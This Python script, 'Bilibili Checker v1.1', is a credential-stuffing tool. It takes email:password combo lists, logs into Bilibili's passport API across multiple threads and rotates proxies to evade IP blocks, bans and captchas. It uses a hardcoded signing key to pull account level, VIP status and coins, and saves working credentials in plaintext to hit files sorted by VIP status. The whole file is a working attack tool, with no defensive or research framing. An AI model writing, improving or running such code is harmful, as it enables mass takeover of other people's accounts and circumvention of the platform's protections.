import requests
import uuid
import time
import os
import hashlib
from base64 import b64encode
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import brotli
import json
from colorama import init, Fore, Style, Back
import threading
from queue import Queue, Empty
import re

init(autoreset=True)

BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════╗
{Fore.CYAN}║ {Fore.MAGENTA}  ____  _ _ _     _     _ _   _ _   _ _____  {Fore.CYAN}║
{Fore.CYAN}║ {Fore.MAGENTA} | __ )(_) (_)___| |__ (_) |_(_) |_(_)__  /  {Fore.CYAN}║
{Fore.CYAN}║ {Fore.MAGENTA} |  _ \| | | / __| '_ \| | __| | __| | / /   {Fore.CYAN}║
{Fore.CYAN}║ {Fore.MAGENTA} | |_) | | | \__ \ | | | | |_| | |_| |/ /_   {Fore.CYAN}║
{Fore.CYAN}║ {Fore.MAGENTA} |____/|_|_|_|___/_| |_|_|\__|_|\__|_/____|  {Fore.CYAN}║
{Fore.CYAN}║                                              ║
{Fore.CYAN}║       {Fore.YELLOW}Bilibili Checker v1.1 (Auto-Pause){Fore.CYAN}             ║
{Fore.CYAN}║       {Fore.GREEN}Updated for Block Detection & Proxy Rotation{Fore.CYAN}        ║
{Fore.CYAN}╚══════════════════════════════════════════════════╝
"""

class ProxyManager:
    """
    Load proxies from file and provide rotation / provisioning to threads.
    Expected proxy file format per line:
      host:port:user:pass
    or
      host:port
    (username/password optional)
    """

    def __init__(self, filename="proxy.txt"):
        self.lock = threading.Lock()
        self.proxies = []  # list of dicts: {host, port, user, password}
        self.index = 0
        self.load(filename)

    def load(self, filename="proxy.txt"):
        self.proxies = []
        try:
            with open(filename, "r", encoding="utf-8") as f:
                for raw in f:
                    line = raw.strip()
                    if not line:
                        continue
                    # parse robustly: host:port:user:pass (user or pass may contain ':')
                    parts = line.split(':')
                    if len(parts) >= 2:
                        host = parts[0]
                        port = parts[1]
                        if len(parts) >= 4:
                            user = parts[2]
                            password = ':'.join(parts[3:])
                        elif len(parts) == 3:
                            user = parts[2]
                            password = ""
                        else:
                            user = ""
                            password = ""
                        self.proxies.append({
                            "host": host,
                            "port": port,
                            "user": user,
                            "password": password,
                            "raw": line
                        })
        except FileNotFoundError:
            # No proxy file, leave proxies empty
            pass

    def has_proxies(self):
        return len(self.proxies) > 0

    def get_next(self):
        with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.index]
            self.index = (self.index + 1) % len(self.proxies)
            return proxy

    def mark_bad(self, proxy):
        """
        Optionally remove a proxy that consistently fails.
        Not used aggressively by default — keep for extension.
        """
        with self.lock:
            try:
                # remove first matching raw
                for i, p in enumerate(self.proxies):
                    if p.get("raw") == proxy.get("raw"):
                        self.proxies.pop(i)
                        # adjust index within bounds
                        self.index = self.index % len(self.proxies) if self.proxies else 0
                        break
            except Exception:
                pass

    def format_for_requests(self, proxy):
        if not proxy:
            return None
        auth = ""
        if proxy.get("user"):
            auth = f"{proxy['user']}:{proxy.get('password', '')}@"
        return f"http://{auth}{proxy['host']}:{proxy['port']}"

class AccountChecker:
    def __init__(self, proxy_manager=None):
        self.lock = threading.Lock()
        self.hits = 0
        self.checked = 0
        self.total = 0
        self.running = True
        # keep pause_event for compatibility but we will auto-rotate proxies on block
        self.pause_event = threading.Event()
        self.pause_event.set()
        self.is_paused = False
        self.proxy_manager = proxy_manager

    def generate_sign(self, params, secret_key="59b43e04ad6965f34319062b478f83dd"):
        params_str = '&'.join([f'{k}={v}' for k, v in sorted(params.items())])
        sign_str = params_str + secret_key
        return hashlib.md5(sign_str.encode('utf-8')).hexdigest()

    def get_account_details(self, session, access_token):
        params = {
            "access_key": access_token,
            "appkey": "7d089525d3611b1c",
            "build": "3291100",
            "c_locale": "",
            "channel": "master",
            "fnval": "16",
            "fnver": "0",
            "lang": "",
            "locale": "en_US",
            "market": "google",
            "mobi_app": "bstar_a",
            "model": "SM-N975F",
            "net_type": "1",
            "osver": "9",
            "platform": "android",
            "prefer_code_type": "0",
            "s_locale": "en_US",
            "sim_code": "51501",
            "statistics": json.dumps({"appId":30,"platform":3,"version":"3.29.1","abtest":""}),
            "timezone": "GMT+08:00",
            "ts": str(int(time.time())),
            "user_qn": "0"
        }
        params["sign"] = self.generate_sign(params)
        url = "https://app.biliintl.com/intl/gateway/v2/app/account/myinfo"
        try:
            response = session.get(url, params=params, timeout=10)
            if response.status_code == 200:
                content = None
                if 'br' in response.headers.get('Content-Encoding', ''):
                    try: content = brotli.decompress(response.content)
                    except: content = response.content
                else:
                    content = response.content
                data = json.loads(content.decode('utf-8'))
                if data.get("code") == 0:
                    return data.get("data", {})
        except:
            pass
        return None

    def set_session_proxy(self, session, proxy):
        """
        Configure session to use the provided proxy.
        """
        if not proxy:
            session.proxies = {}
            session.trust_env = False
            return
        proxy_url = self.proxy_manager.format_for_requests(proxy)
        session.proxies.update({
            "http": proxy_url,
            "https": proxy_url
        })
        session.trust_env = False

    def looks_like_block(self, resp):
        """
        Heuristics to determine if response indicates a block/proxy problem.
        """
        if resp is None:
            return True
        if isinstance(resp, requests.Response):
            if resp.status_code >= 500:
                return True
            # sometimes an empty body or non-json indicates block
            if not resp.content:
                return True
        return False

    def process_account(self, email, password, queue):
        # Wait if global pause (kept for compatibility)
        self.pause_event.wait()

        device_id = str(uuid.uuid4())
        attempt = 0

        # how many proxy attempts: if proxies available, allow trying up to len(proxies) or a few rounds
        max_attempts = max(3, len(self.proxy_manager.proxies) if self.proxy_manager and self.proxy_manager.has_proxies() else 3)

        while attempt < max_attempts:
            attempt += 1
            session = requests.Session()
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.5",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://tv.bilibili.tv",
                "Connection": "keep-alive",
                "Referer": "https://tv.bilibili.tv/",
            }
            session.headers.update(headers)
            session.cookies.update({
                "buvid3": str(uuid.uuid4()),
                "bstar-web-lang": "en",
                "_ga": "GA1.1." + str(uuid.uuid4().hex[:16]),
            })
            params = {
                "s_locale": "en_US",
                "timezone": "Asia/Shanghai",
                "device": "browser",
                "build": "1070000",
                "platform": "ott_web_browser",
                "mobi_app": "bstar_a_t_w_b",
                "ts": str(int(time.time() * 1000)),
                "device_id": device_id,
                "device_name": "Chrome",
                "device_platform": "Windows",
                "networkstate": "wifi",
                "buvid": str(uuid.uuid4()),
            }

            # assign a proxy for this attempt if proxy manager exists
            current_proxy = None
            if self.proxy_manager and self.proxy_manager.has_proxies():
                current_proxy = self.proxy_manager.get_next()
                self.set_session_proxy(session, current_proxy)
                proxy_display = f"{current_proxy['host']}:{current_proxy['port']}"
                try:
                    print(f"{Fore.YELLOW}[Proxy] Using proxy {proxy_display} for {email} (attempt {attempt}/{max_attempts}){Style.RESET_ALL}")
                except:
                    pass

            try:
                # --- Step 1: get key ---
                url = "https://passport.bilibili.tv/x/intl/passport-login/tv/key"
                response = session.get(url, params=params, timeout=12)

                # if response looks like a block/proxy failure -> rotate proxy and retry
                if self.looks_like_block(response):
                    # log and continue to next proxy attempt
                    if current_proxy:
                        print(f"{Back.RED}{Fore.WHITE} [!] Proxy {current_proxy['host']}:{current_proxy['port']} likely blocked or failed (status {getattr(response, 'status_code', 'N/A')}). Rotating... {Style.RESET_ALL}")
                    else:
                        print(f"{Back.RED}{Fore.WHITE} [!] No proxy and request likely failed. Retrying... {Style.RESET_ALL}")
                    session.close()
                    time.sleep(0.5)  # small backoff before next attempt
                    continue

                content = response.content
                if 'br' in response.headers.get('Content-Encoding', ''):
                    try: content = brotli.decompress(content)
                    except: pass

                # parse JSON - if parse fails -> likely blocked/intercepted -> rotate proxy
                try:
                    data = json.loads(content.decode('utf-8'))
                except json.JSONDecodeError:
                    if current_proxy:
                        print(f"{Back.RED}{Fore.WHITE} [!] JSON decode error on key fetch with proxy {current_proxy['host']}:{current_proxy['port']}. Rotating proxy... {Style.RESET_ALL}")
                    session.close()
                    time.sleep(0.5)
                    continue

                # specific server messages
                if data.get("message", "").lower().find("country code") != -1:
                    queue.put((email, Fore.RED + "Please select the correct country code" + Style.RESET_ALL))
                    session.close()
                    with self.lock:
                        self.checked += 1
                    return

                if data.get("code") != 0:
                    # treat non-zero code here as possible temporary block -> rotate
                    msg = data.get("message", "")
                    # if it's clearly credential issue, stop retrying
                    if "key error" in msg.lower() or "param" in msg.lower():
                        queue.put((email, Fore.RED + "Login Failed (Key Error)" + Style.RESET_ALL))
                        session.close()
                        with self.lock:
                            self.checked += 1
                        return
                    # otherwise rotate proxy and retry
                    print(f"{Back.YELLOW}{Fore.BLACK} [!] Key endpoint returned code {data.get('code')} message: {msg}. Rotating proxy/Retrying... {Style.RESET_ALL}")
                    session.close()
                    time.sleep(0.5)
                    continue

                # proceed to encrypt password and login
                key = RSA.import_key(data["data"]["key"])
                cipher = PKCS1_v1_5.new(key)
                encrypted_password = b64encode(cipher.encrypt((data["data"]["hash"] + password).encode())).decode()

                login_data = params.copy()
                login_data.update({
                    "username": email,
                    "password": encrypted_password,
                })
                login_url = "https://passport.bilibili.tv/x/intl/passport-login/tv/login/email/password"
                login_response = session.post(login_url, data=login_data, timeout=15)

                if self.looks_like_block(login_response):
                    if current_proxy:
                        print(f"{Back.RED}{Fore.WHITE} [!] Proxy {current_proxy['host']}:{current_proxy['port']} likely blocked during login (status {getattr(login_response, 'status_code', 'N/A')}). Rotating... {Style.RESET_ALL}")
                    session.close()
                    time.sleep(0.5)
                    continue

                login_content = login_response.content
                if 'br' in login_response.headers.get('Content-Encoding', ''):
                    try: login_content = brotli.decompress(login_content)
                    except: pass

                try:
                    login_data_json = json.loads(login_content.decode('utf-8'))
                except json.JSONDecodeError:
                    if current_proxy:
                        print(f"{Back.RED}{Fore.WHITE} [!] JSON decode error on login with proxy {current_proxy['host']}:{current_proxy['port']}. Rotating... {Style.RESET_ALL}")
                    session.close()
                    time.sleep(0.5)
                    continue

                # Successful login
                if login_data_json.get("code") == 0:
                    access_token = login_data_json["data"]["token_info"]["access_token"]
                    account_details = self.get_account_details(session, access_token)

                    details = {
                        'email': email,
                        'password': password,
                        'username': account_details.get('name', 'N/A') if account_details else 'N/A',
                        'level': account_details.get('level', 'N/A') if account_details else 'N/A',
                        'vip': account_details.get('vip', {}).get('type', 'N/A') if account_details else 'N/A',
                        'coins': account_details.get('coins', 'N/A') if account_details else 'N/A'
                    }

                    with self.lock:
                        self.hits += 1
                        # 1. บันทึก .txt (Format เดิม)
                        with open("bilibili_hits.txt", "a", encoding='utf-8') as hit_file:
                            hit_file.write(f"{details['email']}:{details['password']} | Name: {details['username']} | Level: {details['level']} | Vip: {details['vip']} | Coins: {details['coins']} | Config By = @Rachelle2134\n")

                        # 2. บันทึก .json (Format ใหม่ สวยงาม)
                        try:
                            json_file = "bilibili_hits.json"
                            if os.path.exists(json_file) and os.path.getsize(json_file) > 0:
                                with open(json_file, "r", encoding="utf-8") as f:
                                    json_data = json.load(f)
                            else:
                                json_data = {"hits": [], "vip_hits": []}

                            target_list = "vip_hits" if details['vip'] not in [0, '0', 'N/A'] else "hits"
                            json_data[target_list].append(details)

                            with open(json_file, "w", encoding="utf-8") as f:
                                json.dump(json_data, f, ensure_ascii=False, indent=4)
                        except:
                            pass

                    queue.put((email, Fore.GREEN + "Login Successful" + Style.RESET_ALL))
                    session.close()
                    with self.lock:
                        self.checked += 1
                    return
                elif "incorrect" in login_data_json.get("message", "").lower():
                    queue.put((email, Fore.RED + "Incorrect account credentials" + Style.RESET_ALL))
                    session.close()
                    with self.lock:
                        self.checked += 1
                    return
                else:
                    # If message suggests blocking or risk, rotate proxy and retry
                    msg = login_data_json.get("message", "").lower()
                    if any(x in msg for x in ["block", "blocked", "ip", "access denied", "timeout", "forbid", "ban", "restricted", "captcha"]):
                        print(f"{Back.YELLOW}{Fore.BLACK} [!] Login response indicates potential block: '{login_data_json.get('message')}'. Rotating proxy... {Style.RESET_ALL}")
                        session.close()
                        time.sleep(0.5)
                        continue
                    else:
                        queue.put((email, Fore.RED + login_data_json.get("message", "Login Failed") + Style.RESET_ALL))
                        session.close()
                        with self.lock:
                            self.checked += 1
                        return

            except Exception as e:
                # network or TLS error -> rotate and retry with next proxy
                if current_proxy:
                    print(f"{Back.RED}{Fore.WHITE} [!] Exception with proxy {current_proxy['host']}:{current_proxy['port']}: {str(e)[:120]} -- rotating... {Style.RESET_ALL}")
                else:
                    print(f"{Back.RED}{Fore.WHITE} [!] Exception without proxy: {str(e)[:120]} -- retrying... {Style.RESET_ALL}")
                try:
                    session.close()
                except:
                    pass
                time.sleep(0.5)
                continue

        # If we exhaust attempts
        queue.put((email, Fore.RED + f"Failed after {attempt} attempts / proxy rotations" + Style.RESET_ALL))
        with self.lock:
            self.checked += 1
        return

    def worker(self, queue, result_queue):
        while self.running:
            try:
                account = queue.get(timeout=1)
                if account is None:
                    break
                email, password = account
                self.process_account(email, password, result_queue)
                queue.task_done()
            except Empty:
                continue
            except:
                continue

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    filename = input(Fore.YELLOW + "Enter accounts file (email:password format): " + Style.RESET_ALL).strip()
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            accounts = [line.strip().split(':', 1) for line in file if ':' in line]
    except Exception as e:
        print(Fore.RED + f"Error reading file: {e}" + Style.RESET_ALL)
        return

    proxy_file = input(Fore.YELLOW + "Enter proxy file (default proxy.txt, format host:port:user:pass): " + Style.RESET_ALL).strip()
    if not proxy_file:
        proxy_file = "proxy.txt"

    proxy_manager = ProxyManager(proxy_file)
    if proxy_manager.has_proxies():
        print(Fore.CYAN + f"Loaded {len(proxy_manager.proxies)} proxies from {proxy_file}" + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + f"No proxies loaded from {proxy_file}. Running without proxies." + Style.RESET_ALL)

    try:
        thread_count_input = input(Fore.YELLOW + "Enter number of threads (recommended 5-10): " + Style.RESET_ALL).strip()
        thread_count = int(thread_count_input) if thread_count_input else 5
    except:
        thread_count = 5

    checker = AccountChecker(proxy_manager=proxy_manager)
    checker.total = len(accounts)

    # เคลียร์/สร้างไฟล์ผลลัพธ์
    with open("bilibili_hits.txt", "w", encoding='utf-8') as hit_file:
        hit_file.write("")

    account_queue = Queue()
    result_queue = Queue()
    for account in accounts:
        account_queue.put(account)

    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=checker.worker, args=(account_queue, result_queue))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while checker.checked < checker.total:
            try:
                data = result_queue.get(timeout=0.2)
                # data is (email, status)
                email, status = data
                print(f"[ {Fore.BLUE + email + Style.RESET_ALL} ] = [ {status} ]")
                print(f"\r{Fore.CYAN}Progress: {checker.checked}/{checker.total} | Hits: {checker.hits}{Style.RESET_ALL}", end="", flush=True)
            except Empty:
                continue
            except KeyboardInterrupt:
                break
    except KeyboardInterrupt:
        checker.running = False
        print(Fore.YELLOW + "\nShutting down gracefully..." + Style.RESET_ALL, flush=True)

    checker.running = False
    print(Fore.GREEN + f"\nChecking complete. Hits: {checker.hits}/{checker.total} saved to bilibili_hits.txt & .json" + Style.RESET_ALL, flush=True)

if __name__ == "__main__":
    main()